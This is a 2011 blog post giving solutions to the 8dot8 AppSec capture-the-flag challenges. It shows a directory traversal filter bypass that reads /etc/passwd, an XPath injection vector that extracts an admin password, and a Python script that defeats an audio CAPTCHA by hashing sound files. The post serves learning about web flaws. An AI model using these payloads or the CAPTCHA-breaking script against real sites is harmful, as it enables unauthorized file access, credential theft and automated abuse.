<head>
    <meta charset="utf-8">

    <title>Solution to 8.8 AppSec Challenge</title>

    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">

    <link rel="shortcut icon" href="/favicon.ico">

    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
    <link rel="canonical" href="http://spect.cl/blog/2011/11/solution-to-8-8-appsec-challenge/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="SPECT Research">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Solution to 8.8 AppSec Challenge">
    <meta property="og:description" content="In this post I'll show the solution to the three challenges of 8dot8 AppSec Challenge. The site is not available anymore so the challenge description won't be very detailed. Any information on other ways to solve it are welcome. Challenge 1: Directory Traversal The challenge lied in including successfully the">
    <meta property="og:url" content="http://spect.cl/blog/2011/11/solution-to-8-8-appsec-challenge/">
    <meta property="article:published_time" content="2011-11-23T12:00:00.000Z">
    <meta property="article:modified_time" content="2015-09-10T14:54:13.000Z">
    <meta property="article:tag" content="security">
    <meta property="article:tag" content="ctf">
    
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Solution to 8.8 AppSec Challenge">
    <meta name="twitter:description" content="In this post I'll show the solution to the three challenges of 8dot8 AppSec Challenge. The site is not available anymore so the challenge description won't be very detailed. Any information on other ways to solve it are welcome. Challenge 1: Directory Traversal The challenge lied in including successfully the">
    <meta name="twitter:url" content="http://spect.cl/blog/2011/11/solution-to-8-8-appsec-challenge/">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Claudio Salazar">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="security, ctf">
    <meta name="twitter:site" content="@spectresearch">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "SPECT Research",
        "logo": {
            "@type": "ImageObject",
            "url": "http://spect.cl/favicon.ico",
            "width": 16,
            "height": 16
        }
    },
    "author": {
        "@type": "Person",
        "name": "Claudio Salazar",
        "image": {
            "@type": "ImageObject",
            "url": "//www.gravatar.com/avatar/134e22ab3b4cac1e783f88f84917bc12?s=250&d=mm&r=x",
            "width": 250,
            "height": 250
        },
        "url": "http://spect.cl/author/claudio/",
        "sameAs": []
    },
    "headline": "Solution to 8.8 AppSec Challenge",
    "url": "http://spect.cl/blog/2011/11/solution-to-8-8-appsec-challenge/",
    "datePublished": "2011-11-23T12:00:00.000Z",
    "dateModified": "2015-09-10T14:54:13.000Z",
    "keywords": "security, ctf",
    "description": "In this post I&#x27;ll show the solution to the three challenges of 8dot8 AppSec Challenge. The site is not available anymore so the challenge description won&#x27;t be very detailed. Any information on other ways to solve it are welcome. Challenge 1: Directory Traversal The challenge lied in including successfully the",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "http://spect.cl/"
    }
}
    </script>

    <meta name="generator" content="Ghost 1.16">
    <link rel="alternate" type="application/rss+xml" title="SPECT Research" href="http://spect.cl/rss/">

    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic%7COpen+Sans:700,600,400">
    <style amp-custom>html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:bold}dfn{font-style:italic}h1{margin:0.67em 0;font-size:2em}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{position:relative;vertical-align:baseline;font-size:75%;line-height:0}sup{top:-0.5em}sub{bottom:-0.25em}img{border:0}amp-img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace, monospace;font-size:1em}button,input,optgroup,select,textarea{margin:0;color:inherit;font:inherit}button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"],input[type="submit"]{cursor:pointer;-webkit-appearance:button}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{padding:0;border:0}input{line-height:normal}input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}input[type="number"]::-webkit-inner-spin-button,input[type="number"]::-webkit-outer-spin-button{height:auto}input[type="search"]{-webkit-appearance:textfield}input[type="search"]::-webkit-search-cancel-button,input[type="search"]::-webkit-search-decoration{-webkit-appearance:none}fieldset{margin:0 2px;padding:0.35em 0.625em 0.75em;border:1px solid #c0c0c0}legend{padding:0;border:0}textarea{overflow:auto}optgroup{font-weight:bold}table{border-spacing:0;border-collapse:collapse}td,th{padding:0}html{max-height:100%;height:100%;font-size:62.5%;-webkit-tap-highlight-color:rgba(0, 0, 0, 0)}body{max-height:100%;height:100%;color:#3a4145;background:#f4f8fb;letter-spacing:0.01rem;font-family:"Merriweather", serif;font-size:1.8rem;line-height:1.75em;text-rendering:geometricPrecision;-webkit-font-feature-settings:"kern" 1;-moz-font-feature-settings:"kern" 1;-o-font-feature-settings:"kern" 1}::-moz-selection{background:#d6edff}::selection{background:#d6edff}h1,h2,h3,h4,h5,h6{margin:0 0 0.3em 0;color:#2e2e2e;font-family:"Open Sans", sans-serif;line-height:1.15em;text-rendering:geometricPrecision;-webkit-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1;-moz-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1;-o-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1}h1{text-indent:-2px;letter-spacing:-1px;font-size:2.6rem}h2{letter-spacing:0;font-size:2.4rem}h3{letter-spacing:-0.6px;font-size:2.1rem}h4{font-size:1.9rem}h5{font-size:1.8rem}h6{font-size:1.8rem}a{color:#4a4a4a}a:hover{color:#111}p,ul,ol,dl{margin:0 0 2.5rem 0;font-size:1.5rem;text-rendering:geometricPrecision;-webkit-font-feature-settings:"liga" 1, "onum" 1, "kern" 1;-moz-font-feature-settings:"liga" 1, "onum" 1, "kern" 1;-o-font-feature-settings:"liga" 1, "onum" 1, "kern" 1}ol,ul{padding-left:2em}ol ol,ul ul,ul ol,ol ul{margin:0 0 0.4em 0;padding-left:2em}dl dt{float:left;clear:left;overflow:hidden;margin-bottom:1em;width:180px;text-align:right;text-overflow:ellipsis;white-space:nowrap;font-weight:700}dl dd{margin-bottom:1em;margin-left:200px}li{margin:0.4em 0}li li{margin:0}hr{display:block;margin:1.75em 0;padding:0;height:1px;border:0;border-top:#efefef 1px solid}blockquote{box-sizing:border-box;margin:1.75em 0 1.75em 0;padding:0 0 0 1.75em;border-left:#4a4a4a 0.4em solid;-moz-box-sizing:border-box}blockquote p{margin:0.8em 0;font-style:italic}blockquote small{display:inline-block;margin:0.8em 0 0.8em 1.5em;color:#ccc;font-size:0.9em}blockquote small:before{content:"\2014 \00A0"}blockquote cite{font-weight:700}blockquote cite a{font-weight:normal}mark{background-color:#fdffb6}code,tt{padding:1px 3px;border:#e3edf3 1px solid;background:#f7fafb;border-radius:2px;white-space:pre-wrap;font-family:Inconsolata, monospace, sans-serif;font-size:0.85em;font-feature-settings:"liga" 0;-webkit-font-feature-settings:"liga" 0;-moz-font-feature-settings:"liga" 0}pre{overflow:auto;box-sizing:border-box;margin:0 0 1.75em 0;padding:10px;width:100%;border:#e3edf3 1px solid;background:#f7fafb;border-radius:3px;white-space:pre;font-family:Inconsolata, monospace, sans-serif;font-size:0.9em;-moz-box-sizing:border-box}pre code,pre tt{padding:0;border:none;background:transparent;white-space:pre-wrap;font-size:inherit}kbd{display:inline-block;margin-bottom:0.4em;padding:1px 8px;border:#ccc 1px solid;background:#f4f4f4;border-radius:4px;box-shadow:0 1px 0 rgba(0, 0, 0, 0.2), 0 1px 0 0 #fff inset;color:#666;text-shadow:#fff 0 1px 0;font-size:0.9em;font-weight:700}table{box-sizing:border-box;margin:1.75em 0;max-width:100%;width:100%;background-color:transparent;-moz-box-sizing:border-box}table th,table td{padding:8px;border-top:#efefef 1px solid;vertical-align:top;text-align:left;line-height:20px}table th{color:#000}table caption + thead tr:first-child th,table caption + thead tr:first-child td,table colgroup + thead tr:first-child th,table colgroup + thead tr:first-child td,table thead:first-child tr:first-child th,table thead:first-child tr:first-child td{border-top:0}table tbody + tbody{border-top:#efefef 2px solid}table table table{background-color:#fff}table tbody > tr:nth-child(odd) > td,table tbody > tr:nth-child(odd) > th{background-color:#f6f6f6}table.plain tbody > tr:nth-child(odd) > td,table.plain tbody > tr:nth-child(odd) > th{background:transparent}iframe,amp-iframe,.fluid-width-video-wrapper{display:block;margin:1.75em 0}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper amp-iframe{margin:0}textarea,select,input{margin:0 0 5px 0;padding:6px 9px;width:260px;outline:0;border:#e7eef2 1px solid;background:#fff;border-radius:4px;box-shadow:none;font-family:"Open Sans", sans-serif;font-size:1.6rem;line-height:1.4em;font-weight:100;-webkit-appearance:none}textarea{min-width:250px;min-height:80px;max-width:340px;width:100%;height:auto}input[type="text"]:focus,input[type="email"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="number"]:focus,input[type="date"]:focus,input[type="month"]:focus,input[type="week"]:focus,input[type="time"]:focus,input[type="datetime"]:focus,input[type="datetime-local"]:focus,textarea:focus{outline:none;outline-width:0;border:#bbc7cc 1px solid;background:#fff}select{width:270px;height:30px;line-height:30px}.clearfix:before,.clearfix:after{content:" ";display:table}.clearfix:after{clear:both}.clearfix{zoom:1}.main-header{position:relative;display:table;overflow:hidden;box-sizing:border-box;width:100%;height:50px;background:#5ba4e5 no-repeat center center;background-size:cover;text-align:left;-webkit-box-sizing:border-box;-moz-box-sizing:border-box}.content{background:#fff;padding-top:15px}.blog-title,.content{margin:auto;max-width:600px}.blog-title a{display:block;padding-right:16px;padding-left:16px;height:50px;color:#fff;text-decoration:none;font-family:"Open Sans", sans-serif;font-size:16px;line-height:50px;font-weight:600}.post{position:relative;margin-top:0;margin-right:16px;margin-left:16px;padding-bottom:0;max-width:100%;border-bottom:#ebf2f6 1px solid;word-wrap:break-word;font-size:0.95em;line-height:1.65em}.post-header{margin-bottom:1rem}.post-title{margin-bottom:0}.post-title a{text-decoration:none}.post-meta{display:block;margin:3px 0 0 0;color:#9eabb3;font-family:"Open Sans", sans-serif;font-size:1.3rem;line-height:2.2rem}.post-meta a{color:#9eabb3;text-decoration:none}.post-meta a:hover{text-decoration:underline}.post-meta .author{margin:0;font-size:1.3rem;line-height:1.3em}.post-date{display:inline-block;text-transform:uppercase;white-space:nowrap;font-size:1.2rem;line-height:1.2em}.post-image{margin:0;padding-top:3rem;padding-bottom:30px;border-top:1px #E8E8E8 solid}.post-content amp-img,.post-content amp-anim{position:relative;left:50%;display:block;padding:0;min-width:0;max-width:112%;width:calc(100% + 32px);height:auto;transform:translateX(-50%);-webkit-transform:translateX(-50%);-ms-transform:translateX(-50%)}.footnotes{font-size:1.3rem;line-height:1.6em;font-style:italic}.footnotes li{margin:0.6rem 0}.footnotes p{margin:0}.footnotes p a:last-child{text-decoration:none}.site-footer{position:relative;margin:0 auto 20px auto;padding:1rem 15px;max-width:600px;color:rgba(0,0,0,0.5);font-family:"Open Sans", sans-serif;font-size:1.1rem;line-height:1.75em}.site-footer a{color:rgba(0,0,0,0.5);text-decoration:none;font-weight:bold}.site-footer a:hover{border-bottom:#bbc7cc 1px solid}.poweredby{display:block;float:right;width:45%;text-align:right}.copyright{display:block;float:left;width:45%}</style>

    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
    <script async src="https://cdn.ampproject.org/v0.js"></script>

    

</head>

<body class="amp-template">
    <header class="main-header">
        <nav class="blog-title">
            <a href="http://spect.cl">SPECT Research</a>
        </nav>
    </header>

    <main class="content" role="main">
        <article class="post">

            <header class="post-header">
                <h1 class="post-title">Solution to 8.8 AppSec Challenge</h1>
                <section class="post-meta">
                    <p class="author">by <a href="/author/claudio/">Claudio Salazar</a></p>
                    <time class="post-date" datetime="2011-11-23">2011-11-23</time>
                </section>
            </header>
            <section class="post-content">

                <div class="kg-card-markdown"><p>In this post I'll show the solution to the three challenges of <em><a href="http://www.8dot8.org/">8dot8</a> AppSec Challenge</em>. The site is not available anymore so the challenge description won't be very detailed. Any information on other ways to solve it are welcome.</p>
<h2 id="challenge1directorytraversal">Challenge 1: Directory Traversal</h2>
<p>The challenge lied in including successfully the file <code>/etc/passwd</code> through a parameter vulnerable to a <em>Directory  Traversal</em> attack. Although, the exploitation wasn't immediate. The passed value through the parameter was sanitized by a function that doesn't allow to scale directories to reach the desired file. To illustrate what happened, the following code snippet.</p>
<pre><code class="language-language-python">&gt;&gt;&gt; param = '../../../../../../etc/passwd'
&gt;&gt;&gt; param.replace('../', '')
'etc/passwd'
</code></pre>
<p>With those conditions, I had to find a vector that could bypass that sanitization function. The pattern is showed next.</p>
<pre><code class="language-language-python">&gt;&gt;&gt; param = '....//....//....//....//....//....//etc/passwd'
&gt;&gt;&gt; param.replace('../', '')
'../../../../../../etc/passwd'
</code></pre>
<p>With that vector the challenge was solved.</p>
<h2 id="challenge2xpathinjection">Challenge 2: XPath Injection</h2>
<p>The second challenge involved a form vulnerable to <em>XPath Injection</em>. If even it could be solved using the <em>Blind XPath Injection</em> technique, first confirming the length with <code>string-length(/users/user[1]/password)</code> and then getting the chars with <code>substring()</code>, I utilized the concatenation. The admin password had to be concatenated with the second user's name, and it should show  <code>admin_password+name_second_user</code>, however it showed the admin password. My vector of attack to get the admin's password was:</p>
<p><code>1]/password|/users/user[2</code></p>
<p>With the above vector, the final string was: <code>/users/user[1]/password|/users/user[2]/name</code></p>
<p>As result, I got:</p>
<pre><code class="language-language-html">/users/user[1]/password|/users/user[2]/name --&gt;Wrong password!&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;
    &lt;form method="POST" action=""&gt;
    &lt;label for="user"&gt;User:&lt;/label&gt;&lt;br/&gt;
    &lt;input id="user" name="user" value="iLovePwnies"/&gt;&lt;br/&gt;
</code></pre>
<h2 id="challenge3captcha">Challenge 3: Captcha</h2>
<p>I found the last challenge the most entertaining to solve. It was a <em>CAPTCHA</em> with images hard to decrypt through some script, but it had the option to play the audio with each letter present in the <em>CAPTCHA</em> word. The security flaw was added with that feature since, in spite of the name of the audio files were<br>
random, each word was always the same word pronounced.</p>
<p>For this challenge, I first downloaded the audio files and I created my letter dictionary, relating the <em>MD5</em> sum of each audio file with its pronounced letter, up to complete the alphabet. Then, the script requested the page with the <em>CAPTCHA</em>, reviewed the <em>HTML</em> code, got the audio filenames, downloaded them and the script compared their <em>MD5</em> sum to the sums in my letter dictionary. That procedure returned me the key. All that 2500 times, because it was necessary to solve 500 CAPTCHAS of 5 letters each one. The code was the following:</p>
<pre><code class="language-language-python">#!/usr/bin/env python
import sys
import urllib
import urllib2
import re
import hashlib
import os
import socket

origGetAddrInfo = socket.getaddrinfo

def getAddrInfoWrapper(host, port, family=0, socktype=0, proto=0, flags=0):
    return origGetAddrInfo(host, port, socket.AF_INET, socktype, proto, flags)

# replace the original socket.getaddrinfo by our version
socket.getaddrinfo = getAddrInfoWrapper

letters = {
    'A': 'fc630d2b617c8b7e94c4812bfdb4c151',
    'B': '8ff4175902822c97a2f198bb17b596c8',
    'C': 'd6e9c5eb4bf9e2bb50dadf197fd9f9ad',
    'D': 'fc756bdca7c344c0b3a96f9fb9f3ca23',
    'E': '76f061e25691fe8c37fc12948a68c776',
    'F': '37db61f33af775fe40675c98810851d4',
    'G': '910352bd873c9d541f329cfdd348910d',
    'H': 'e8ddefee7523fd2947b7493eab90f895',
    'I': '1830ef4838c5149155f49e41d049af46',
    'J': 'dd9823c94ee36251f68a746862f87018',
    'K': 'df64287d9b711ee4a19b1d158ca4aa35',
    'L': '64cb2a64734a34d59d10d4ebb05e9d0e',
    'M': '4ac77b8f485b4050dc395aa52d812a9d',
    'N': '2aca06e764670cf4855e22da6d9ff00d',
    'O': '94fb69e7a14c15f4598ce122b7991436',
    'P': 'de2178a2bb4570b3c4c1a55e0432bb61',
    'Q': '8691e9fa1d84c9295f5f695580bfd4c3',
    'R': '0e680cb2891cf82f8941df92f2a384e3',
    'S': '33db6e42a8930f521263ba4818c4e835',
    'T': '4b3266346cfc6255b1bd031d62aaf5e3',
    'U': 'c4cc3f1a52e8e8fd1b9ee0e4f1885baa',
    'V': '919f5e551b7a319338523725d4d8f96a',
    'W': 'fb960f767bd6f8f210115aa6faa7d936',
    'X': 'c48d1f2c8e957e03538a0c780b11f0b6',
    'Y': 'bcfb544b8b6040021322023c8f3e2a5c',
    'Z': '684fcaa5a5c61c317b7b3ad2575a8066'
}

i = 0
captcha = ''
url = 'https://challenge.dreamlab.net/?captcha=%s&amp;page=challenge&amp;cid=11'
play_url = 'https://challenge.dreamlab.net/challenges_dir/11/playAudio.php?audio=%s'
cookie = 'PHPSESSID=eo251g8dl5obdbvjjbm49kmeg3'
pattern = re.compile('var soundQueue = new Array\(\n\t"(.*)","x"')
score = re.compile('You\'ve solved &lt;em&gt;(\d+)&lt;/em&gt;')

while True:
    print 'Requesting %s' % (url % captcha)
    req = urllib2.Request(url % captcha)
    req.add_header('Cookie', cookie)
    response = urllib2.urlopen(req).read()

    c = score.search(response)
    if c:
        print 'Captchas resolved: %s' % c.groups()[0]

    m = pattern.search(response)
    sounds = m.groups()[0].split('","')

    captcha = ''
    for s in sounds:
        req = urllib2.Request(play_url % s)
        req.add_header('Cookie', cookie)
        response = urllib2.urlopen(req).read()

        md5 = hashlib.md5(response).hexdigest()
        captcha += [k for k, v in letters.iteritems() if v == md5][0]

    i = i + 1
    print 'Sending packet #%d' % i
</code></pre>
<p>Greetings and I wait another solutions!</p>
</div>

            </section>

        </article>
    </main>
    <footer class="site-footer clearfix">
        <section class="copyright"><a href="http://spect.cl">SPECT Research</a> © 2017</section>
        <section class="poweredby">Proudly published with <a href="https://ghost.org">Ghost</a></section>
    </footer>
</body>
